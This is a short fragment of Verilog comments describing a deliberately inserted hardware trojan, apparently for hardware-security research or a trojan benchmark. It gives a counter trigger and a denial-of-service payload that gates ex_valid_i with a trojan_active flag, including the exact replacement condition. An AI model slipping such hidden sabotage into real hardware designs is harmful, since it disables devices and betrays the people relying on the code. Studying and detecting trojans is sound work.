 ...
 * 
 * Description:
 *   Disables operations by blocking ex_valid_i control signal
 *   
 * Trigger: Counter on ex_valid_i
 * Payload: Block ex_valid_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block ex_valid_i when trojan is active
//
// IMPORTANT: ex_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (ex_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: ex_valid_i && 0 = 0 (always false)
//   All operations controlled by ex_valid_i are blocked
